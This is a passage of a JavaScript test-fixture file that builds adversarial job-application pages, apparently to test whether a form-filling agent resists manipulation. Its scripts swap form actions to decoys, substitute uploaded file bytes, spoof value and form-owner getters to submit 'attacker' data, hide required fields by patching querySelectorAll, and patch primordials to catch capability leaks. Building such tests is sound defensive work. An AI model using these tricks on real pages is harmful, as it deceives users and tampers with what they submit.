  <label for="late-email">Email *</label><input id="late-email" name="email" type="email" required aria-invalid="true">
  <label for="late-resume">Resume</label><input id="late-resume" name="candidate_resume" type="file">
  ` + (explicit
    ? '<button id="send" type="submit">Submit application</button>'
    : '<button id="send" type="submit">Send</button>') + `
</form>
<form id="late-decoy"><input name="message" value="decoy"></form><div id="submitted"></div>
<script>${HELPERS}
  var lateSubmit = document.getElementById('send');
  var lateEmailInputs = 0;
  document.getElementById('late-email').addEventListener('input', function () {
    lateEmailInputs += 1;
    if (lateEmailInputs === 3) document.getElementById('late-decoy').append(lateSubmit);
  });
</script>`;

const REACTIVATED_UNRELATED_FORM = `<!doctype html><meta charset="utf-8"><title>Application reactivated unrelated form</title>
<form id="newsletter" novalidate>
  <label for="reactivated-newsletter">Newsletter email</label><input id="reactivated-newsletter" type="email">
</form>
<form id="application_form" novalidate>
  <label for="reactivated-email">Email *</label><input id="reactivated-email" type="email" required aria-invalid="true">
  <label for="reactivated-resume">Resume</label><input id="reactivated-resume" name="candidate_resume" type="file">
  <button id="send" type="submit">Send</button>
</form><button id="drift-unrelated" type="button">Drift unrelated proof</button><div id="submitted"></div>
<script>${HELPERS}
  document.getElementById('drift-unrelated').addEventListener('click', function () {
    document.getElementById('reactivated-newsletter').value = 'temporarily-different@example.com';
  });
  document.getElementById('reactivated-email').addEventListener('input', function () {
    document.getElementById('reactivated-newsletter').value = 'alerts@example.com';
  });
  document.getElementById('application_form').addEventListener('submit', function (event) {
    event.preventDefault(); record('reactivated-unrelated');
  });
</script>`;

const LATE_BASE_HREF_DRIFT = `<!doctype html><meta charset="utf-8"><base id="base-url" href="/initial/"><title>Application base URL drift</title>
<form id="application_form" action="jobs/application" novalidate>
  <label for="base-email">Email *</label><input id="base-email" type="email" required aria-invalid="true">
  <label for="base-resume">Resume</label><input id="base-resume" name="candidate_resume" type="file">
  <button id="send" type="submit">Send</button>
</form><button id="arm-base" type="button">Arm base change</button><div id="submitted"></div>
<script>${HELPERS}
  var baseArmed = false;
  document.getElementById('arm-base').addEventListener('click', function () { baseArmed = true; });
  document.getElementById('base-email').addEventListener('input', function () {
    if (!baseArmed) return;
    baseArmed = false;
    document.getElementById('base-url').href = '/changed/';
  });
  document.getElementById('application_form').addEventListener('submit', function (event) {
    event.preventDefault(); record('late-base-href');
  });
</script>`;

const HISTORY_PARITY = WORKABLE_BARE_SEND
  .replace('</form>', '</form><button id="history" type="button">History</button>')
  .replace('</script>', `
  document.getElementById('history').addEventListener('click', function () {
    history.pushState({}, '', location.pathname + '#application-step');
  });
</script>`);

const SHADOW_BARE_SEND = `<!doctype html><meta charset="utf-8"><title>Shadow application</title>
<div id="host"></div><div id="submitted"></div>
<script>${HELPERS}
  var root = document.getElementById('host').attachShadow({ mode: 'open' });
  root.innerHTML = '<form id="application_form"><label>Email<input id="shadow-email" type="email"></label>'
    + '<label>Resume<input id="shadow-resume" name="candidate_resume" type="file"></label>'
    + '<button id="shadow-send" type="submit">Send</button></form>';
  root.getElementById('application_form').addEventListener('submit', function (event) {
    event.preventDefault(); record('shadow-send');
  });
</script>`;

const WORKABLE_WITH_UNRELATED_FORM = WORKABLE_BARE_SEND.replace(
  '<form id="application"',
  '<form id="newsletter"><label for="newsletter-email">Newsletter email</label>'
    + '<input id="newsletter-email" type="email"><button type="button">Subscribe</button></form>'
    + '<form id="application"'
);

const EXPLICIT_SUBMIT_WITH_ONLY_UNRELATED_PROOF = `<!doctype html><meta charset="utf-8"><title>Application with unrelated proof</title>
<form id="application_form" action="/native-integrity-real" method="post">
  <label for="application-email">Application email</label>
  <input id="application-email" name="email" type="email">
  <button id="send" type="submit">Submit application</button>
</form>
<form id="unrelated_form" action="/native-decoy" method="post">
  <label for="unrelated-email">Unrelated email</label>
  <input id="unrelated-email" name="email" type="email">
</form><div id="submitted">unrelated proof fixture</div>`;

const TEXT_REPURPOSE_DRIFT = `<!doctype html><meta charset="utf-8"><title>Application text repurpose</title>
<form id="application_form" novalidate>
  <label id="identity-one" for="identity-email">Applicant email</label><input id="identity-email" name="applicant_email" type="email">
  <label id="identity-two" for="identity-name">Applicant name</label><input id="identity-name" name="applicant_name">
  <button id="send" type="submit">Send</button>
</form><button id="mutate" type="button">Mutate</button><div id="submitted"></div>
<script>${HELPERS}
  document.getElementById('application_form').addEventListener('submit', function (event) {
    event.preventDefault(); record('text-repurpose');
  });
  document.getElementById('mutate').addEventListener('click', function () {
    var first = document.getElementById('identity-email');
    var second = document.getElementById('identity-name');
    first.id = 'support-email'; first.name = 'support_email';
    second.id = 'support-message'; second.name = 'support_message';
    document.getElementById('identity-one').htmlFor = first.id;
    document.getElementById('identity-one').textContent = 'Support email';
    document.getElementById('identity-two').htmlFor = second.id;
    document.getElementById('identity-two').textContent = 'Support message';
  });
</script>`;

const FAILED_TEXT_PERSISTENCE = `<!doctype html><meta charset="utf-8"><title>Application failed persistence</title>
<form id="candidate_application" novalidate>
  <label for="candidate-name">Applicant name</label><input id="candidate-name" name="applicant_name">
  <label for="candidate-resume">Resume</label><input id="candidate-resume" name="candidate_resume" type="file">
  <button id="send" type="submit">Send</button>
</form><div id="submitted"></div>
<script>${HELPERS}
  document.getElementById('candidate-name').addEventListener('input', function (event) {
    if (event.currentTarget.value === 'Mehek') event.currentTarget.value = 'Different applicant';
  });
  document.getElementById('candidate_application').addEventListener('submit', function (event) {
    event.preventDefault(); record('failed-persistence');
  });
</script>`;

const ASYNC_TEXT_DRIFT = FAILED_TEXT_PERSISTENCE
  .replace('<title>Application failed persistence</title>', '<title>Application async text drift</title>')
  .replace(
    "if (event.currentTarget.value === 'Mehek') event.currentTarget.value = 'Different applicant';",
    "if (event.currentTarget.value === 'Mehek') { var control = event.currentTarget; setTimeout(function () { control.value = 'Different applicant'; }, 0); }"
  )
  .replace("record('failed-persistence');", "record('async-text-drift');");

const ASYNC_LABELLED_DIGIT_DRIFT = `<!doctype html><meta charset="utf-8"><title>Application labelled digit drift</title>
<form id="candidate_application" novalidate>
  <div><label for="experience-value">Years of experience</label><input id="experience-value" name="experience"></div>
  <label for="digit-resume">Resume</label><input id="digit-resume" name="candidate_resume" type="file">
  <button id="send" type="submit">Send</button>
</form><div id="submitted"></div>
<script>${HELPERS}
  document.getElementById('experience-value').addEventListener('input', function (event) {
    if (event.currentTarget.value === '10') event.currentTarget.value = '10+';
  });
  document.getElementById('candidate_application').addEventListener('submit', function (event) {
    event.preventDefault(); record('labelled-digit-drift');
  });
</script>`;

const URL_HOP_START = `<!doctype html><meta charset="utf-8"><title>Application URL start</title>
<form id="candidate_application"><label>First<input id="first-hop"></label></form>
<script>
  document.getElementById('first-hop').addEventListener('input', function () {
    setTimeout(function () { location.href = '/url-hop-wrong'; }, 0);
  });
</script>`;

const URL_HOP_WRONG = `<!doctype html><meta charset="utf-8"><title>Wrong workflow</title>
<div id="wrong-ready"></div>
<form id="candidate_application">
  <label>Second<input id="second-hop"></label>
  <label><input type="radio" name="sms_opt_in" value="yes">Yes</label>
  <label><input id="decline-hop" type="radio" name="sms_opt_in" value="no">No</label>
  <button id="wrong-send" type="submit" disabled>Send</button>
</form>
<script>${HELPERS}
  document.getElementById('second-hop').addEventListener('input', function () { record('second-fill'); });
  document.getElementById('decline-hop').addEventListener('change', function () { record('optin-decline'); });
</script>`;

const INITIAL_REDIRECT_TARGET = `<!doctype html><meta charset="utf-8"><title>Redirected application</title>
<form id="application_form" action="/native-real" method="post" enctype="multipart/form-data">
  <label for="redirect-email">Email</label><input id="redirect-email" name="email" type="email">
  <label for="redirect-resume">Resume</label><input id="redirect-resume" name="resume" type="file">
  <button id="send" type="submit">Send</button>
</form><div id="submitted"></div>
<script>${HELPERS}
  document.getElementById('redirect-email').addEventListener('input', function () { record('redirect-email-fill'); });
  document.getElementById('redirect-resume').addEventListener('change', function () { record('redirect-resume-upload'); });
</script>`;

const nativeActivationPage = (mode) => `<!doctype html><meta charset="utf-8"><title>Native activation ${mode}</title>
<form id="application_form" action="/native-real" method="post" enctype="multipart/form-data">
  <label for="native-email">Email</label><input id="native-email" name="email" type="email">
  <label for="native-resume">Resume</label><input id="native-resume" name="resume" type="file">
  ${mode === 'submit-aria-required' || mode === 'submit-star-marker' || mode === 'pre-arm-required'
    ? '<label id="late-required-label" for="pre-arm-required">Late custom field</label>'
      + '<input id="pre-arm-required" name="late_required">'
    : ''}
  <button id="send" type="submit">Send</button>
</form>
<form id="decoy_form" action="/native-decoy" method="post"></form>
<div id="submitted">activation fixture</div>
<script>
  var activationMode = ${JSON.stringify(mode)};
  var applicationForm = document.getElementById('application_form');
  var decoyForm = document.getElementById('decoy_form');
  var submitControl = document.getElementById('send');
  var cachedNativeSubmit = HTMLFormElement.prototype.submit;
  if (['pointerdown', 'mousedown', 'focus', 'click'].includes(activationMode)) {
    submitControl.addEventListener(activationMode, function () {
      applicationForm.action = '/native-decoy';
    });
  }
  if (activationMode === 'submit-action') {
    applicationForm.addEventListener('submit', function () {
      applicationForm.action = '/native-decoy';
    });
  }
  if (activationMode === 'submit-association') {
    applicationForm.addEventListener('submit', function () {
      submitControl.setAttribute('form', 'decoy_form');
    });
  }
  if (activationMode === 'submit-aria-required') {
    applicationForm.addEventListener('submit', function () {
      document.getElementById('pre-arm-required').setAttribute('aria-required', 'true');
    });
  }
  if (activationMode === 'submit-star-marker') {
    applicationForm.addEventListener('submit', function () {
      document.getElementById('late-required-label').textContent = 'Late custom field *';
    });
  }
  if (activationMode === 'submit-cancel-direct-real') {
    applicationForm.addEventListener('submit', function (event) {
      event.preventDefault();
      cachedNativeSubmit.call(applicationForm);
    });
  }
  if (activationMode === 'cached-direct-real' || activationMode === 'cached-direct-decoy') {
    submitControl.addEventListener('click', function (event) {
      event.preventDefault();
      cachedNativeSubmit.call(activationMode === 'cached-direct-real' ? applicationForm : decoyForm);
    });
  }
  if (activationMode === 'synthetic-witness') {
    submitControl.addEventListener('click', function (event) {
      event.preventDefault();
      applicationForm.dispatchEvent(new SubmitEvent('submit', {
        bubbles: true,
        cancelable: true,
        submitter: submitControl
      }));
      applicationForm.dispatchEvent(new FormDataEvent('formdata', {
        formData: new FormData()
      }));
      cachedNativeSubmit.call(applicationForm);
    });
  }
</script>`;

const WORKABLE_NATIVE_ALLOWLIST = `<!doctype html><meta charset="utf-8"><title>Native Workable application</title>
<form id="application" action="/native-real" method="post" enctype="multipart/form-data">
  <label for="workable-firstname">First name</label>
  <input id="workable-firstname" name="firstname">
  <label for="workable-email">Email</label>
  <input id="workable-email" name="email" type="email">
  <label for="workable-avatar">Avatar</label>
  <input id="workable-avatar" name="avatar" type="file">
  <label for="workable-resume">Resume</label>
  <input id="workable-resume" name="resume" type="file" data-ui="resume">
  <span id="workable-experience-label">* Which development experience applies?</span>
  <div role="group" aria-labelledby="workable-experience-label">
    <label><input type="checkbox" name="5854742" value="internship" aria-required="true">Internship</label>
    <label><input type="checkbox" name="5854743" value="hackathon" aria-required="true" checked>Hackathon</label>
    <label><input type="checkbox" name="5854744" value="individual" aria-required="true">Individual Development</label>
  </div>
  <button id="send" type="submit">Send</button>
</form>
<form id="avatar-decoy">
  <input name="firstname"><input name="email"><input name="avatar" type="file">
</form>
<div id="submitted">native Workable fixture</div>`;

const WORKABLE_NATIVE_ALLOWLIST_EMPTY = WORKABLE_NATIVE_ALLOWLIST.replace(
  'name="5854743" value="hackathon" aria-required="true" checked',
  'name="5854743" value="hackathon" aria-required="true"'
);

const NATIVE_SERIALIZER = `<!doctype html><meta charset="utf-8"><title>Native application serializer</title>
<form id="application_form" action="/native-real" method="post" enctype="application/x-www-form-urlencoded">
  <label for="serializer-email">Email</label>
  <input id="serializer-email" name="email" type="email">
  <fieldset name="fieldset_must_not_serialize">
    <legend>Preferred role</legend>
    <label><input id="serializer-engineering" name="role" type="radio" value="engineering">Engineering</label>
    <label><input id="serializer-product" name="role" type="radio" value="product">Product</label>
  </fieldset>
  <output name="output_must_not_serialize">ignored</output>
  <label for="serializer-resume">Resume</label>
  <input id="serializer-resume" name="resume" type="file">
  <button id="send" name="decision" value="apply" type="submit">Send</button>
</form><div id="submitted">serializer fixture</div>`;

const NATIVE_MULTIPART_SERIALIZER = `<!doctype html><meta charset="utf-8"><title>Native multipart application serializer</title>
<form id="application_form" action="/native-multipart-real" method="post" enctype="multipart/form-data">
  <label for="multipart-email">Email</label>
  <input id="multipart-email" name="email" type="email">
  <input name="role" type="hidden" value="engineering">
  <input name="role" type="hidden" value="security">
  <label for="multipart-resume">Resume</label>
  <input id="multipart-resume" name="resume" type="file">
  <button id="send" name="decision" value="apply" type="submit">Submit application</button>
</form><div id="submitted">multipart serializer fixture</div>`;

const NATIVE_FILE_BYTE_SUBSTITUTION = `<!doctype html><meta charset="utf-8"><title>Native file integrity application</title>
<form id="application_form" action="/native-file-integrity-real" method="post" enctype="multipart/form-data">
  <label for="integrity-email">Email</label><input id="integrity-email" name="email" type="email">
  <label for="integrity-resume">Resume</label><input id="integrity-resume" name="resume" type="file">
  <button id="mutate" type="button">Review attachment</button>
  <button id="send" type="submit">Submit application</button>
</form><div id="submitted">file integrity fixture</div>
<script>
  document.getElementById('mutate').addEventListener('click', function () {
    var input = document.getElementById('integrity-resume');
    var original = input.files && input.files[0];
    if (!original) return;
    File.prototype.arrayBuffer = async function () {
      return new TextEncoder().encode('resume').buffer;
    };
    if (globalThis.SubtleCrypto) {
      SubtleCrypto.prototype.digest = async function () { return new Uint8Array(32).buffer; };
    }
    var transfer = new DataTransfer();
    transfer.items.add(new File(['attack'], original.name, {
      type: original.type,
      lastModified: original.lastModified
    }));
    input.files = transfer.files;
  });
</script>`;

const NATIVE_TEXT_VALUE_GETTER_SPOOF = `<!doctype html><meta charset="utf-8"><title>Native text value spoof</title>
<form id="application_form" action="/native-integrity-real" method="post">
  <label for="spoof-email">Email</label><input id="spoof-email" name="email" type="email">
  <button id="send" type="submit">Submit application</button>
</form><div id="submitted">text spoof fixture</div>
<script>
  var email = document.getElementById('spoof-email');
  var nativeValueSetter = Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, 'value').set;
  email.addEventListener('input', function () {
    nativeValueSetter.call(email, 'attacker@example.com');
    Object.defineProperty(email, 'value', {
      configurable: true,
      get: function () { return 'applicant@example.com'; }
    });
  }, { once: true });
</script>`;

const NATIVE_SELECT_VALUE_GETTER_SPOOF = `<!doctype html><meta charset="utf-8"><title>Native select value spoof</title>
<form id="application_form" action="/native-integrity-real" method="post">
  <label for="spoof-role">Role</label><select id="spoof-role" name="role">
    <option value="">Choose</option><option value="eng">Engineering</option>
  </select>
  <button id="send" type="submit">Submit application</button>
</form><div id="submitted">select spoof fixture</div>
<script>
  var role = document.getElementById('spoof-role');
  var nativeOptionValueSetter = Object.getOwnPropertyDescriptor(HTMLOptionElement.prototype, 'value').set;
  role.addEventListener('change', function () {
    nativeOptionValueSetter.call(role.options[1], 'attacker');
    Object.defineProperty(role, 'value', {
      configurable: true,
      get: function () { return 'eng'; }
    });
  }, { once: true });
</script>`;

const NATIVE_TEXTAREA_WHITESPACE_DRIFT = `<!doctype html><meta charset="utf-8"><title>Native textarea whitespace drift</title>
<form id="application_form" action="/native-integrity-real" method="post">
  <label for="textarea-answer">Why this role?</label>
  <textarea id="textarea-answer" name="answer"></textarea>
  <button id="send" type="submit">Submit application</button>
</form><div id="submitted">textarea whitespace fixture</div><div id="attempted">not attempted</div>
<script>
  var answer = document.getElementById('textarea-answer');
  var nativeTextareaValueGetter = Object.getOwnPropertyDescriptor(HTMLTextAreaElement.prototype, 'value').get;
  var nativeTextareaValueSetter = Object.getOwnPropertyDescriptor(HTMLTextAreaElement.prototype, 'value').set;
  answer.addEventListener('input', function () {
    if (nativeTextareaValueGetter.call(answer) !== 'Line one\\nLine two') return;
    nativeTextareaValueSetter.call(answer, 'Line one Line two');
    document.getElementById('attempted').textContent = 'collapsed';
  });
</script>`;

const NATIVE_HIDDEN_CHOICE_LABEL_SPOOF = `<!doctype html><meta charset="utf-8"><title>Native hidden choice label spoof</title>
<form id="application_form" action="/native-integrity-real" method="post">
  <fieldset>
    <legend>Work authorization</legend>
    <input id="authorization-yes" name="authorization" type="radio" value="attacker">
    <label for="authorization-yes"><span hidden>Yes</span></label>
  </fieldset>
  <button id="send" type="submit">Submit application</button>
</form><div id="submitted">hidden choice label fixture</div><div id="attempted">not attempted</div>
<script>
  var authorization = document.getElementById('authorization-yes');
  Object.defineProperty(authorization, 'value', {
    configurable: true,
    get: function () { return 'Yes'; }
  });
  authorization.addEventListener('change', function () {
    document.getElementById('attempted').textContent = 'checked';
  });
</script>`;

const NATIVE_LEGACY_VERIFIER_WRITE_DRIFT = `<!doctype html><meta charset="utf-8"><title>Native legacy verifier write drift</title>
<form id="application_form" action="/native-integrity-real" method="post">
  <label for="legacy-email">Email</label><input id="legacy-email" name="email" type="email">
  <button id="send" type="submit">Submit application</button>
</form><div id="submitted">legacy verifier fixture</div><div id="attempted">not attempted</div>
<script>
  var legacyEmail = document.getElementById('legacy-email');
  var nativeInputValueSetter = Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, 'value').set;
  legacyEmail.addEventListener('input', function () {
    nativeInputValueSetter.call(legacyEmail, 'attacker@example.com');
    document.getElementById('attempted').textContent = 'rewritten';
  });
</script>`;

const NATIVE_MAIN_WORLD_PRIMORDIAL_PATCHES = `<!doctype html><meta charset="utf-8"><title>Native main-world primordial patches</title>
<script>
  var nativeObjectKeys = Object.keys;
  var nativeObjectIs = Object.is;
  var nativeArraySlice = Array.prototype.slice;
  var nativeEval = window.eval;
  var nativeReflectApply = Reflect.apply;
  globalThis.__primordialCapabilityLeak = 'no';
  function markLeak() {
    globalThis.__primordialCapabilityLeak = 'yes';
    var output = document.getElementById('capability-leaked');
    if (output) output.textContent = 'yes';
    var state = document.getElementById('capability-state');
    if (state) state.value = 'yes';
  }
  function inspect(value) {
    try {
      if (typeof value === 'string' && /^[0-9a-f]{48}$/.test(value)) {
        markLeak();
      }
      if (value && typeof value === 'object'
        && (typeof value.nativePostBindingJson === 'function'
          || typeof value.finalizeActivationJson === 'function')) {
        markLeak();
      }
    } catch {}
  }
  Object.keys = function (value) { inspect(value); return nativeObjectKeys(value); };
  Object.is = function (left, right) { inspect(left); inspect(right); return nativeObjectIs(left, right); };
  Array.prototype.slice = function () {
    for (var index = 0; index < this.length; index += 1) inspect(this[index]);
    return nativeReflectApply(nativeArraySlice, this, arguments);
  };
  window.eval = function (source) {
    if (String(source).includes('__litosV4SubmissionContainment')) {
      markLeak();
    }
    return nativeReflectApply(nativeEval, window, [source]);
  };
  Reflect.apply = function (target, receiver, args) {
    inspect(receiver);
    if (args) for (var index = 0; index < args.length; index += 1) inspect(args[index]);
    return nativeReflectApply(target, receiver, args);
  };
</script>
<form id="application_form" action="/native-integrity-real" method="post">
  <label for="primordial-email">Email</label><input id="primordial-email" name="email" type="email">
  <input id="capability-state" name="capability_state" type="hidden" value="no">
  <button id="send" type="submit">Submit application</button>
</form><div id="submitted">primordial patch fixture</div>
<div id="capability-leaked"></div>
<script>document.getElementById('capability-leaked').textContent = globalThis.__primordialCapabilityLeak;</script>`;

const NATIVE_NAMELESS_PROOF_CONTROLS = `<!doctype html><meta charset="utf-8"><title>Native nameless proof controls</title>
<form id="application_form" action="/native-integrity-real" method="post">
  <label for="nameless-first">First name</label><input id="nameless-first">
  <label for="nameless-last">Last name</label><input id="nameless-last">
  <button id="send" type="submit">Send</button>
</form><div id="submitted">nameless proof fixture</div>`;

const NATIVE_MULTI_SELECT_INJECTION = `<!doctype html><meta charset="utf-8"><title>Native multi-select injection</title>
<form id="application_form" action="/native-integrity-real" method="post">
  <label for="multi-role">Role</label><select id="multi-role" name="role" multiple>
    <option value="eng">Engineering</option>
    <option value="attacker">Attacker-selected role</option>
  </select>
  <button id="send" type="submit">Submit application</button>
</form><div id="submitted">multi-select injection fixture</div>
<script>
  document.getElementById('multi-role').addEventListener('change', function (event) {
    event.currentTarget.options[1].selected = true;
  });
</script>`;

const NATIVE_FORM_OWNER_GETTER_SPOOF = `<!doctype html><meta charset="utf-8"><title>Native form owner spoof</title>
<form id="application_form" action="/native-integrity-real" method="post">
  <button id="send" type="submit">Submit application</button>
</form>
<form id="decoy" action="/native-decoy" method="post"></form>
<label for="spoof-owner-email">Email</label>
<input id="spoof-owner-email" class="spoof-owner" form="decoy" name="email" type="email">
<label for="spoof-owner-resume">Resume</label>
<input id="spoof-owner-resume" class="spoof-owner" form="decoy" name="resume" type="file">
<div id="submitted">form owner spoof fixture</div>
<script>
  var nativeFormGetter = Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, 'form').get;
  Object.defineProperty(HTMLInputElement.prototype, 'form', {
    configurable: true,
    get: function () {
      return this.classList.contains('spoof-owner')
        ? document.getElementById('application_form')
        : nativeFormGetter.call(this);
    }
  });
</script>`;

const NATIVE_FORGED_SUBMIT_LABEL = `<!doctype html><meta charset="utf-8"><title>Native forged submit label</title>
<form id="application_form" action="/native-integrity-real" method="post" enctype="multipart/form-data">
  <label for="native-email">Email</label><input id="native-email" name="email" type="email">
  <label for="native-resume">Resume</label><input id="native-resume" name="resume" type="file">
  <button id="send" type="submit">Continue</button>
</form><div id="submitted">forged submit label fixture</div>
<script>
  Object.defineProperty(document.getElementById('send'), 'innerText', {
    configurable: true,
    get: function () {
      document.getElementById('application_form').action = '/native-decoy';
      return 'Submit application';
    }
  });
</script>`;

const NATIVE_HIDDEN_SUBMIT_TEXT = `<!doctype html><meta charset="utf-8"><title>Native hidden submit text</title>
<form id="application_form" action="/native-integrity-real" method="post" enctype="multipart/form-data">
  <label for="native-email">Email</label><input id="native-email" name="email" type="email">
  <label for="native-resume">Resume</label><input id="native-resume" name="resume" type="file">
  <button id="send" type="submit">Continue<span hidden>Submit application</span></button>
</form><div id="submitted">hidden submit text fixture</div>`;

const NATIVE_OPACITY_ZERO_SUBMIT = `<!doctype html><meta charset="utf-8"><title>Native opacity zero submit</title>
<form id="application_form" action="/native-integrity-real" method="post">
  <label for="opacity-email">Email</label><input id="opacity-email" name="email" type="email">
  <div style="opacity: 0">
    <button id="send" type="submit">Submit application</button>
  </div>
</form><div id="submitted">opacity zero submit fixture</div>`;

const NATIVE_OPTIN_VALUE_GETTER_SPOOF = `<!doctype html><meta charset="utf-8"><title>Native opt-in value spoof</title>
<form id="application_form" action="/native-integrity-real" method="post" enctype="multipart/form-data">
  <label for="optin-email">Email</label><input id="optin-email" name="email" type="email">
  <label for="optin-resume">Resume</label><input id="optin-resume" name="resume" type="file">
  <label><input id="optin-accept" type="radio" name="sms_opt_in" value="yes">Yes</label>
  <label><input id="optin-decline" type="radio" name="sms_opt_in" value="no">No</label>
  <button id="send" type="submit" disabled>Submit application</button>
</form><div id="submitted">opt-in value spoof fixture</div>
<script>
  var accept = document.getElementById('optin-accept');
  Object.defineProperty(accept, 'value', {
    configurable: true,
    get: function () { return 'no'; }
  });
  for (var radio of document.querySelectorAll('input[name="sms_opt_in"]')) {
    radio.addEventListener('change', function () {
      document.getElementById('send').disabled = false;
    });
  }
</script>`;

const NATIVE_REQUIRED_SELECTOR_SPOOF = `<!doctype html><meta charset="utf-8"><title>Native required selector spoof</title>
<script>
  var nativeQuerySelectorAll = Element.prototype.querySelectorAll;
  var nativeMatches = Element.prototype.matches;
  Element.prototype.querySelectorAll = function (selector) {
    if (String(selector).includes('required')) return [];
    return nativeQuerySelectorAll.call(this, selector);
  };
  Element.prototype.matches = function (selector) {
    if (this.id === 'legal' && String(selector).includes('required')) return false;
    return nativeMatches.call(this, selector);
  };
</script>
<form id="application_form" action="/native-integrity-real" method="post" enctype="multipart/form-data">
  <label for="required-email">Email</label><input id="required-email" name="email" type="email">
  <label for="required-resume">Resume</label><input id="required-resume" name="resume" type="file">
  <label for="legal">Legal acknowledgement</label><input id="legal" name="legal" aria-required="true">
  <button id="send" type="submit">Submit application</button>
</form><div id="submitted">required selector spoof fixture</div>`;

const NATIVE_CUSTOM_REQUIRED_SELECTOR_SPOOF = `<!doctype html><meta charset="utf-8"><title>Native custom required selector spoof</title>
<script>
  var nativeQuerySelectorAll = Element.prototype.querySelectorAll;
  var nativeMatches = Element.prototype.matches;
  Element.prototype.querySelectorAll = function (selector) {
    var found = nativeQuerySelectorAll.call(this, selector);
    if (!String(selector).includes('aria-required')) return found;
    return Array.prototype.filter.call(found, function (element) {
      return element.id !== 'required-department';
    });
  };
  Element.prototype.matches = function (selector) {
    if (this.id === 'required-department' && String(selector).includes('aria-required')) return false;
    return nativeMatches.call(this, selector);
  };
</script>
<form id="application_form" action="/native-integrity-real" method="post" enctype="multipart/form-data">
  <label for="custom-required-email">Email</label><input id="custom-required-email" name="email" type="email">
  <label for="custom-required-resume">Resume</label><input id="custom-required-resume" name="resume" type="file">
  <label id="department-label">Department</label>
  <div id="required-department" role="combobox" aria-labelledby="department-label"
    aria-required="true" aria-expanded="false" tabindex="0" style="width: 240px; height: 32px">
    <span>Select department</span>
  </div>
  <button id="send" type="submit">Submit application</button>
</form><div id="submitted">custom required selector spoof fixture</div>`;

const NATIVE_CUSTOM_REQUIRED_ARIA_ONLY = `<!doctype html><meta charset="utf-8"><title>Native custom required ARIA-only answer</title>
<form id="application_form" action="/native-integrity-real" method="post" enctype="multipart/form-data">
  <label for="aria-only-email">Email</label><input id="aria-only-email" name="email" type="email">
  <label for="aria-only-resume">Resume</label><input id="aria-only-resume" name="resume" type="file">
  <label id="aria-only-department-label">Department</label>
  <div id="aria-only-department" role="combobox" aria-labelledby="aria-only-department-label"
    aria-required="true" aria-expanded="false" aria-activedescendant="aria-only-department-option"
    aria-valuetext="Engineering" tabindex="0" style="width: 240px; height: 32px">
    <span id="aria-only-department-option" role="option" aria-selected="true">Engineering</span>
  </div>
  <button id="send" type="submit">Submit application</button>
</form><div id="submitted">custom required ARIA-only answer fixture</div>`;

const NATIVE_REQUIRED_CLASS_MARKER_SPOOF = `<!doctype html><meta charset="utf-8"><title>Native required class marker spoof</title>
<script>
  var nativeElementQuerySelectorAll = Element.prototype.querySelectorAll;
  var nativeDocumentQuerySelectorAll = Document.prototype.querySelectorAll;
  var nativeMatches = Element.prototype.matches;
  function hideRequiredClassMarker(found) {
    return Array.prototype.filter.call(found, function (element) {
      return element.id !== 'class-only-label';
    });
  }
  Element.prototype.querySelectorAll = function (selector) {
    var found = nativeElementQuerySelectorAll.call(this, selector);
    return String(selector).includes('_required_') ? hideRequiredClassMarker(found) : found;
  };
  Document.prototype.querySelectorAll = function (selector) {
    var found = nativeDocumentQuerySelectorAll.call(this, selector);
    return String(selector).includes('_required_') ? hideRequiredClassMarker(found) : found;
  };
  Element.prototype.matches = function (selector) {
    if (this.id === 'class-only-label' && String(selector).includes('_required_')) return false;
    return nativeMatches.call(this, selector);
  };
</script>
<form id="application_form" action="/native-integrity-real" method="post" enctype="multipart/form-data">
  <label for="class-only-email">Email</label><input id="class-only-email" name="email" type="email">
  <label for="class-only-resume">Resume</label><input id="class-only-resume" name="resume" type="file">
  <label id="class-only-label" class="question_required_marker" for="class-only-answer">
    Employer question
    <input id="class-only-answer" name="class-only-answer" type="text">
  </label>
  <button id="send" type="submit">Submit application</button>
</form><div id="submitted">required class marker spoof fixture</div>`;

const NATIVE_REQUIRED_STAR_MARKER_SPOOF = `<!doctype html><meta charset="utf-8"><title>Native required star marker spoof</title>
<script>
  var nativeElementQuerySelectorAll = Element.prototype.querySelectorAll;
  var nativeDocumentQuerySelectorAll = Document.prototype.querySelectorAll;
  var nativeMatches = Element.prototype.matches;
  function hideRequiredStarMarker(found) {
    return Array.prototype.filter.call(found, function (element) {
      return element.id !== 'star-only-label';
    });
  }
  Element.prototype.querySelectorAll = function (selector) {
    var found = nativeElementQuerySelectorAll.call(this, selector);
    return String(selector).includes('label') ? hideRequiredStarMarker(found) : found;
  };
  Document.prototype.querySelectorAll = function (selector) {
    var found = nativeDocumentQuerySelectorAll.call(this, selector);
    return String(selector).includes('label') ? hideRequiredStarMarker(found) : found;
  };
  Element.prototype.matches = function (selector) {
    if (this.id === 'star-only-label' && String(selector).includes('label')) return false;
    return nativeMatches.call(this, selector);
  };
</script>
<form id="application_form" action="/native-integrity-real" method="post" enctype="multipart/form-data">
  <label for="star-only-email">Email</label><input id="star-only-email" name="email" type="email">
  <label for="star-only-resume">Resume</label><input id="star-only-resume" name="resume" type="file">
  <label id="star-only-label" for="star-only-answer">Employer question *</label>
  <input id="star-only-answer" name="star-only-answer" type="text">
  <button id="send" type="submit">Submit application</button>
</form><div id="submitted">required star marker spoof fixture</div>`;

const NATIVE_REQUIRED_UNASSOCIATED_STAR_MARKER_SPOOF = `<!doctype html><meta charset="utf-8"><title>Native unassociated star marker spoof</title>
<script>
  var nativeElementQuerySelectorAll = Element.prototype.querySelectorAll;
  var nativeDocumentQuerySelectorAll = Document.prototype.querySelectorAll;
  function hideUnassociatedStarMarker(found) {
    return Array.prototype.filter.call(found, function (element) {
      return element.id !== 'star-sibling-label';
    });
  }
  Element.prototype.querySelectorAll = function (selector) {
    var found = nativeElementQuerySelectorAll.call(this, selector);
    return String(selector).includes('label') ? hideUnassociatedStarMarker(found) : found;
  };
  Document.prototype.querySelectorAll = function (selector) {
    var found = nativeDocumentQuerySelectorAll.call(this, selector);
    return String(selector).includes('label') ? hideUnassociatedStarMarker(found) : found;
  };
</script>
<form id="application_form" action="/native-integrity-real" method="post" enctype="multipart/form-data">
  <label for="star-sibling-email">Email</label><input id="star-sibling-email" name="email" type="email">
  <label for="star-sibling-resume">Resume</label><input id="star-sibling-resume" name="resume" type="file">
  <div class="field">
    <label id="star-sibling-label">Employer question *</label>
    <div role="combobox" aria-valuetext="Engineering">Engineering</div>
    <input id="star-sibling-answer" name="department" type="hidden" value="">
  </div>
